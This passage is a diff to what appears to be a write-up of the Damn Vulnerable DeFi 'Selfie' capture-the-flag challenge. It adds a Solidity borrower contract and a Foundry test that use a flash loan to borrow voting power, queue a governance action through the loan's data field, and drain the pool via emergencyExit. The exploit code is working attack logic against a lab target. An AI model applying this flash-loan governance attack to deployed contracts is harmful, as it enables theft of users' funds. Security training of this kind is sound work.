@@ -54,4 +54,46 @@ Then use it on the test case:
     }
 ```
 
+### Alternative solution using the data param of the `flashLoan` function (Just for fun)
 
+We can pass a encoded queue function call, and append the governance address at the end of the data, to take it as target (following a similar pattern that `_msgSender` on `naiveReceiver` challenge):
+
+```solidity
+contract Borrower is IERC3156FlashBorrower {
+    function onFlashLoan(
+        address /*initiator*/,
+        address token,
+        uint256 amount,
+        uint256 /*fee*/,
+        bytes calldata data
+    ) external returns (bytes32) {
+        DamnValuableVotes(token).delegate(address(this));
+        
+        address target = address(bytes20(data[data.length-20:]));
+        target.call(data);
+
+        // approve and return to avoid tx to fail 
+        DamnValuableVotes(token).approve(msg.sender, amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
+```
+
+```solidity
+    function test_selfie() public 
+    checkSolvedByPlayer 
+    {
+        
+        Borrower borrower = new Borrower();
+
+        // pass queueAction call on the data param of `flashLoan`
+        bytes memory attack_data = abi.encodeWithSignature('emergencyExit(address)', recovery);
+        bytes memory callback_data = abi.encodeWithSignature('queueAction(address,uint128,bytes)', pool, 0, attack_data);
+        // add the governance address at the end of the data to retrieve it on `onFlashLoan`
+        callback_data = abi.encodePacked(callback_data, address(governance));
+        pool.flashLoan(borrower, address(token), pool.maxFlashLoan(address(token)), callback_data);
+
+        vm.warp(2 days + 1);
+        governance.executeAction(1);
+    }
+```
